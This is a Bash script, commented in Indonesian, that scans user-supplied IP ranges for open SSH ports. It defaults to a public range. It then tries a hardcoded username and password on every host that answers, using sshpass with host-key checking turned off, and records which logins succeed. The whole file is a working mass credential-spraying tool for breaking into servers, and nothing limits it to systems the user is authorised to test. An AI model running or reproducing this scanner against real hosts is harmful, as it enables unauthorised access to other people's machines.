#!/bin/bash

# Warna untuk output terminal
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"

# File untuk daftar IP yang digenerate
GENERATED_IPS="generated_ips.txt"

# File output untuk IP yang terbuka
OPEN_IPS="open_ips.txt"

# File untuk login berhasil
SUCCESSFUL_LOGINS="successful_logins.txt"

# File debug SSH
SSH_DEBUG_LOG="ssh_debug.log"

# Port SSH yang akan diperiksa
SSH_PORT=22

# Username dan password SSH
USERNAME="cloudsigma"
PASSWORD="Cloud2025"

# Bersihkan file output jika sudah ada sebelumnya
> "$GENERATED_IPS"
> "$OPEN_IPS"
> "$SUCCESSFUL_LOGINS"
> "$SSH_DEBUG_LOG"

# Fungsi untuk menampilkan header
show_header() {
    clear
    echo -e "${BLUE}"
    echo "=========================================="
    echo "    SSH SCANNER & LOGIN CHECKER"
    echo "    Multi IP Base Support"
    echo "=========================================="
    echo -e "${ENDCOLOR}"
}

# Fungsi untuk memvalidasi IP base
validate_ip_base() {
    local ip_base=$1
    # Validasi format IP (xxx.xxx.xxx atau xxx.xxx)
    if [[ ! $ip_base =~ ^([0-9]{1,3}\.){1,2}[0-9]{1,3}$ ]]; then
        return 1
    fi
    
    # Validasi setiap octet
    IFS='.' read -ra OCTETS <<< "$ip_base"
    for octet in "${OCTETS[@]}"; do
        if [[ $octet -lt 0 || $octet -gt 255 ]]; then
            return 1
        fi
    done
    
    return 0
}

# Fungsi untuk memeriksa status SSH
check_ssh() {
    local ip=$1
    if timeout 3 bash -c "</dev/tcp/$ip/$SSH_PORT" &>/dev/null; then
        echo -e "$ip:${GREEN} AKTIF ${ENDCOLOR}"
        echo "$ip" >> "$OPEN_IPS"
    else
        echo -e "$ip:${RED} CLOSED ${ENDCOLOR}"
    fi
}

# Fungsi untuk mencoba login SSH dengan error handling yang lebih baik
check_ssh_login() {
    local ip=$1
    local output=""
    local exit_code=0
    
    # Coba login SSH dengan sshpass dan timeout
    output=$(timeout 10 sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 -o BatchMode=yes "$USERNAME@$ip" "echo 'Login Successful'" 2>&1) || exit_code=$?
    
    # Analisis output
    if [[ $exit_code -eq 0 ]]; then
        echo -e "$ip:${GREEN} OPEN (Login Successful) ${ENDCOLOR}"
        echo "ssh $USERNAME@$ip" >> "$SUCCESSFUL_LOGINS"
        echo "$ip" >> successful_ips.txt
    elif [[ $output == *"Permission denied"* ]]; then
        echo -e "$ip:${YELLOW} OPEN (Permission Denied - Wrong Password) ${ENDCOLOR}"
        echo "$ip" >> wrong_password_ips.txt
    elif [[ $output == *"Your password has expired"* ]] || [[ $output == *"password expired"* ]]; then
        echo -e "$ip:${YELLOW} OPEN (Password Expired) ${ENDCOLOR}"
        echo "$ip" >> expired_password_ips.txt
    elif [[ $output == *"Connection timed out"* ]]; then
        echo -e "$ip:${RED} CLOSED (Connection Timeout) ${ENDCOLOR}"
    elif [[ $output == *"No route to host"* ]]; then
        echo -e "$ip:${RED} CLOSED (No Route to Host) ${ENDCOLOR}"
    elif [[ $output == *"Connection refused"* ]]; then
        echo -e "$ip:${RED} CLOSED (Connection Refused) ${ENDCOLOR}"
    elif [[ $exit_code -eq 124 ]]; then
        echo -e "$ip:${RED} CLOSED (Timeout) ${ENDCOLOR}"
    else
        echo -e "$ip:${YELLOW} UNKNOWN (Check Debug Log) ${ENDCOLOR}"
        echo "IP: $ip - Exit Code: $exit_code - Output: $output" >> "$SSH_DEBUG_LOG"
    fi
}

# Main script
show_header

# Input multiple IP bases
echo -e "${YELLOW}Masukkan IP bases (pisahkan dengan spasi):${ENDCOLOR}"
echo -e "Contoh: 94.156.202 94.156.203 192.168.1"
read -p "IP Bases: " -a IP_BASES

# Jika tidak ada input, gunakan default
if [ ${#IP_BASES[@]} -eq 0 ]; then
    IP_BASES=("94.156.202")
    echo -e "Menggunakan IP base default: ${IP_BASES[0]}"
fi

# Validasi IP bases
for base in "${IP_BASES[@]}"; do
    if ! validate_ip_base "$base"; then
        echo -e "${RED}Error: IP base '$base' tidak valid!${ENDCOLOR}"
        exit 1
    fi
done

# Input range
read -p "Masukkan nilai AWAL (default: 1): " START
START=${START:-1}

read -p "Masukkan nilai AKHIR (default: 100): " END
END=${END:-100}

# Validasi range
if [ $START -gt $END ]; then
    echo -e "${RED}Error: Nilai AWAL tidak boleh lebih besar dari AKHIR!${ENDCOLOR}"
    exit 1
fi

echo -e "\n${GREEN}Membuat daftar IP...${ENDCOLOR}"

# Generate IP addresses dari multiple bases
for base in "${IP_BASES[@]}"; do
    for i in $(seq "$START" "$END"); do
        echo "$base.$i" >> "$GENERATED_IPS"
    done
    echo -e "IP base $base: $START-$END ditambahkan"
done

echo -e "\n${GREEN}IP berhasil digenerate ke file $GENERATED_IPS${ENDCOLOR}"
sleep 2

show_header
echo -e "${GREEN}Memeriksa koneksi SSH...${ENDCOLOR}"

# Hitung total IP
TOTAL_IPS=$(wc -l < "$GENERATED_IPS")
CURRENT=0

# Loop melalui setiap IP di file untuk memeriksa status SSH
while IFS= read -r ip || [[ -n "$ip" ]]; do
    ((CURRENT++))
    echo -n "[$CURRENT/$TOTAL_IPS] "
    check_ssh "$ip"
done < "$GENERATED_IPS"

echo -e "\n${GREEN}IP yang terbuka disimpan di $OPEN_IPS${ENDCOLOR}"
sleep 2

# Hapus known hosts untuk IP yang terbuka
if [[ -s $OPEN_IPS ]]; then
    echo -e "${YELLOW}Menghapus known hosts...${ENDCOLOR}"
    while IFS= read -r ip || [[ -n "$ip" ]]; do
        ssh-keygen -f "/root/.ssh/known_hosts" -R "$ip" &>/dev/null
    done < "$OPEN_IPS"
fi

sleep 2
show_header

# Periksa apakah ada IP yang terbuka
if [[ ! -f $OPEN_IPS || ! -s $OPEN_IPS ]]; then
    echo -e "${RED}Tidak ada IP yang terbuka!${ENDCOLOR}"
    exit 1
fi

OPEN_COUNT=$(wc -l < "$OPEN_IPS")
echo -e "${GREEN}Memeriksa login SSH untuk $OPEN_COUNT IP yang terbuka...${ENDCOLOR}"
echo -e "${YELLOW}Username: $USERNAME${ENDCOLOR}"
echo -e "${YELLOW}Password: $PASSWORD${ENDCOLOR}"
echo -e "\nProses mungkin memakan waktu beberapa menit...\n"

# Bersihkan file hasil sebelumnya
> "$SUCCESSFUL_LOGINS"
> successful_ips.txt
> wrong_password_ips.txt
> expired_password_ips.txt

CURRENT=0
TOTAL_OPEN=$(wc -l < "$OPEN_IPS")

# Loop melalui setiap IP yang terbuka untuk mencoba login SSH
while IFS= read -r ip || [[ -n "$ip" ]]; do
    ((CURRENT++))
    echo -n "[$CURRENT/$TOTAL_OPEN] "
    check_ssh_login "$ip"
    
    # Tambahkan delay kecil untuk menghindari overload
    sleep 0.5
done < "$OPEN_IPS"

# Tampilkan summary
echo -e "\n${BLUE}=== SUMMARY ===${ENDCOLOR}"
if [[ -f successful_ips.txt ]]; then
    SUCCESS_COUNT=$(wc -l < successful_ips.txt 2>/dev/null || echo 0)
    echo -e "${GREEN}Login berhasil: $SUCCESS_COUNT IP${ENDCOLOR}"
fi

if [[ -f wrong_password_ips.txt ]]; then
    WRONG_PWD_COUNT=$(wc -l < wrong_password_ips.txt 2>/dev/null || echo 0)
    echo -e "${YELLOW}Password salah: $WRONG_PWD_COUNT IP${ENDCOLOR}"
fi

if [[ -f expired_password_ips.txt ]]; then
    EXPIRED_COUNT=$(wc -l < expired_password_ips.txt 2>/dev/null || echo 0)
    echo -e "${YELLOW}Password expired: $EXPIRED_COUNT IP${ENDCOLOR}"
fi

echo -e "\n${GREEN}Proses selesai!${ENDCOLOR}"
echo -e "Detail login disimpan di:"
echo -e "  - Login berhasil: $SUCCESSFUL_LOGINS"
echo -e "  - Debug info: $SSH_DEBUG_LOG"
